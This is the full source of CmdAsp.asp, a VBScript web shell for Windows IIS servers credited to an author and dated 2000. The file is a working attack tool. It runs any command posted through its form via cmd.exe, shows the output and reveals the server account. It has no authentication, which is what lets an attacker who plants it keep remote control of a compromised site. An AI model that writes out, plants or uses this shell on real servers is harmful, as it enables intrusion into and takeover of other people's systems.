<%@ Language=VBScript %>
<%
  ' --------------------o0o--------------------
  '  File:    CmdAsp.asp
  '  Author:  Maceo <maceo @ dogmile.com>
  '  Release: 2000-12-01
  '  OS:      Windows 2000, 4.0 NT
  ' -------------------------------------------

  Dim oScript
  Dim oScriptNet
  Dim oFileSys, oStdoutFile, oStderrFile
  Dim szCMD, szPWD, szStdoutFile, szStderrFile, szFormattedCmd

  On Error Resume Next

  ' -- create the COM objects that we will be using -- '
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

  ' -- check for a command that we have posted -- '
  szCMD = Request.Form(".CMD")
  If (szCMD <> "") Then
    ' -- Use a poor man's pipe ... a temp file -- '
    szPWD = oFileSys.GetParentFolderName(Server.MapPath(Request.ServerVariables("URL")))
    szStdoutFile = szPWD & "\" &  oFileSys.GetTempName()
    szStderrFile = szStdoutFile & ".err"
    szFormattedCmd = "cmd.exe /c " & szCMD & " > " & szStdoutFile & " 2> " & szStderrFile
    Call oScript.Run (szFormattedCmd, 0, True)
    Set oStdoutFile = oFileSys.OpenTextFile (szStdoutFile, 1, False, 0)
    Set oStderrFile = oFileSys.OpenTextFile (szStderrFile, 1, False, 0)

  End If

%>
<HTML>
<BODY>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name=".CMD" size=45 value="<%= szCMD %>">
<input type=submit value="Run">
</FORM>
<PRE>
<hr>
# Environment #
<br>
<%= "User: \\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<br>
<%= "PWD: " & szPWD %>
<br>
<%= "Command: " & szCMD %>
<br>
<%= "Formatted cmd: " & szFormattedCmd %>
<br>
<%
  ' -- Read the stdout from our command and remove the temp file -- '
  If (IsObject(oStdoutFile)) Then
    On Error Resume Next
    Response.Write "<hr># Stdout #<br>"
    Response.Write Server.HTMLEncode(oStdoutFile.ReadAll)
    oStdoutFile.Close
    Call oFileSys.DeleteFile(szStdoutFile, True)
  End If

  ' -- Read the stderr from our command and remove the temp file -- '
  If (IsObject(oStderrFile)) Then
    On Error Resume Next
    Response.Write "<hr># Stderr #<br>"
    Response.Write Server.HTMLEncode(oStderrFile.ReadAll)
    oStderrFile.Close
    Call oFileSys.DeleteFile(oStderrFile, True)
  End If

  ' -- If no stadout and no stderr then execution failed -- '
  If Not ((IsObject(oStdoutFile)) or (IsObject(oStderrFile))) Then
    Response.Write "<hr>Status: execution failed"
  End If
%>
</BODY>
</HTML>

<!--    http://michaeldaw.org   2006    -->
